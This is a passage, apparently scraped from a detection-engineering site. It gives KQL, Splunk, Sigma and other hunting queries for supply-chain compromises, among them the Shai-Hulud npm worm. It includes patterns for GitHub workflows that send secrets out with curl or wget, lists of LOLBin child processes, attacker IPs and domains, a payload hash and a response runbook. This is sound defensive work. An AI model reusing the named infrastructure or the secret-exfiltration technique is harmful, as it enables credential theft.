    | project DvcHostname, GitTime = TimeGenerated, ActorUsername, ActingProcessCommandLine
) on DvcHostname
| where abs(datetime_diff('second', TimeGenerated, GitTime)) < 120
| project TimeGenerated, DvcHostname, TargetFilePath, TargetFileName, ActorUsername, ActingProcessCommandLine
| order by TimeGenerated desc
source:github.audit @action:(git.push OR workflows.created_workflow_run OR repo.add_member) @repo.path:*.github/workflows/* @raw.message:(*secrets.* AND (*curl* OR *wget*))
#event_simpleName=FileWritten
| regex("(\\\\|/)\\.github(\\\\|/)workflows(\\\\|/)", field=TargetFileName)
| TargetFileName=/\.(yml|yaml)$/i
| join({#event_simpleName=ProcessRollup2 | ImageFileName=/git(\.exe)?$/i | regex("(commit|push)", field=CommandLine)}, field=aid, key=aid)
| groupBy([aid, ComputerName, TargetFileName], function=count())
CLOUD
index=* sourcetype=*github* (source=*.yml OR source=*.yaml) ("secrets." OR "${{ secrets.") ("curl " OR "wget ") path=".github/workflows/*" | rex max_match=20 field=_raw "secrets\.(?<secret_name>[A-Z0-9_]+)" | stats dc(secret_name) as unique_secrets values(secret_name) as secret_names values(host) as host by source repo commit_sha author | where unique_secrets >= 3 | sort - unique_secrets
Trusted vendor binary / installer launching unusual children Exploitation Medium
Supply-chain trojan signal: legitimate signed binary spawning script interpreters or exotic LOLBins.
ATT&CKT1195.002
Data sourcesEndpoint.Processes DeviceProcessEvents
DeviceProcessEvents
| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where InitiatingProcessFileName in~ ("setup.exe","installer.exe","update.exe")
| where FileName in~ ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, FileName, ProcessCommandLine
// Replace `"setup.exe","installer.exe","update.exe"` with the vendor binaries observed in the
// article (matching shape with the Defender query).
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"
| where ParentProcessName has_any ("setup.exe","installer.exe","update.exe")
| where NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\rundll32.exe"
   or NewProcessName endswith "\regsvr32.exe"
   or NewProcessName endswith "\mshta.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\wmic.exe"
   or NewProcessName endswith "\bitsadmin.exe"
| project TimeGenerated, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
Network connections to article IPs / domains Command & Control High
Outbound traffic to attacker infrastructure named in the article.
ATT&CKT1071
Data sourcesNetwork_Traffic.All_Traffic Web Network_Resolution.DNS DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where RemoteIP in ("45.139.104.115") or RemoteUrl has_any ("bold-dhawan.45-139-104-115.plesk.page", "objective-hopper.45-139-104-115.plesk.page", "carte-avantage.com", "493networking.cc")
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessFileName, InitiatingProcessCommandLine
let BadIPs     = dynamic(["45.139.104.115"]);
let BadDomains = dynamic(["bold-dhawan.45-139-104-115.plesk.page", "objective-hopper.45-139-104-115.plesk.page", "carte-avantage.com", "493networking.cc"]);
ImNetworkSession
| where TimeGenerated > ago(7d)
| where DstIpAddr in (BadIPs)
   or Url has_any (BadDomains)
| project TimeGenerated, DvcHostname, DstIpAddr, DstPortNumber, Url, NetworkProtocol
| order by TimeGenerated desc

title: Outbound Connection to Article-Named IP / Domain
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0f
status: experimental
description: |
    Replace `__IP_LIST__` / `__DOMAIN_LIST__` placeholders with
    article-specific destinations. For dynamic IOC management, use a
    watchlist or external feed.
references:
    - https://attack.mitre.org/tactics/TA0011/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.command-and-control
logsource:
    category: network_connection
    product: windows
detection:
    selection_ip:
        DestinationIp:
            - '__IP_PLACEHOLDER_1__'
            - '__IP_PLACEHOLDER_2__'
    selection_domain:
        DestinationHostname:
            - '__DOMAIN_PLACEHOLDER_1__'
            - '__DOMAIN_PLACEHOLDER_2__'
    condition: selection_ip or selection_domain
falsepositives:
    - None on a true-positive IOC match
level: critical

| `drop_dm_object_name(All_Traffic)`

Shai-Hulud bundle.js postinstall payload by known SHA256 hash AIInstallation Medium
Detects file write or process load of the malicious npm postinstall payload bundle.js with the SHA256 hash published by Snyk/Unit42/Wiz for the Shai-Hulud worm. This is the most authoritative IOC for any host that installed a compromised ngx-bootstrap / ng2-file-upload / @ctrl/tinycolor / @ctrl/* / @nativescript-community/* / @crowdstrike/* package. Rationale: Hash 46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09 was published by Snyk for the bundle.js payload and corroborated by Unit42 and Wiz as the canonical Shai-Hulud postinstall blob. Hash-based detection is the cleanest possible TP signal — any hit is the actual worm payload landing on disk or being loaded. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack • https://www.sysdig.com/blog/shai-hulud-the-novel-self-replicating-worm-infecting-hundreds-of-npm-packages
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Filesystem Endpoint.Processes
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researchers intentionally downloading the IOC sample into a sandbox for analysis
  • SOC analysts writing the hash into threat-intel notes / IOC docs that get indexed by file scanners
  • Backup or DR replication re-introducing the file from a snapshot taken pre-eradication
  • Vulnerability-scanner / SBOM tool fetching the unpublished tarball for analysis
Suppression filter
| where not(FolderPath has_any ("\\malware-analysis\\", "\\sandbox\\", "\\IOC-samples\\")) and not(InitiatingProcessFileName in~ ("defender.exe", "MsMpEng.exe", "trufflehog.exe"))
Response runbook
1) Triage: confirm the host installed an affected package version (check package-lock.json, pnpm-lock.yaml, yarn.lock for ngx-bootstrap@18.1.4/19.0.3/20.0.3-20.0.6, ng2-file-upload, @ctrl/tinycolor, @ctrl/*, @nativescript-community/*, @crowdstrike/* installed on/after 2025-09-15). Pull DeviceProcessEvents around the file event for parent npm/node context. 2) Contain: isolate host; revoke all npm, GitHub PAT/SSH, and cloud (AWS/GCP/Azure) credentials touched on the host within the last 30 days from a CLEAN workstation per GitHub Advisory GHSA-6m4g-vm7c-f8w6. 3) Hunt: pivot on aid/DeviceId for outbound webhook.site traffic (UC2), TruffleHog execution (UC3), and shai-hulud-workflow.yml drops (UC4); audit user's GitHub org for new public repos named 'Shai-Hulud' or workflow files named shai-hulud-workflow.yml.
let ShaiHuludBundleHash = "46faab8ab153fae6e80e7cca38eab363075bb524edd79e42269217a083628f09";

  (DeviceFileEvents | where Timestamp > ago(30d) | where SHA256 == ShaiHuludBundleHash | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName),
  (DeviceImageLoadEvents | where Timestamp > ago(30d) | where SHA256 == ShaiHuludBundleHash | project Timestamp, DeviceName, FileName, FolderPath, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName=tostring(InitiatingProcessAccountName))
| order by Timestamp desc

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, TargetFileName, TargetFileSHA256, EventVendor, EventProduct
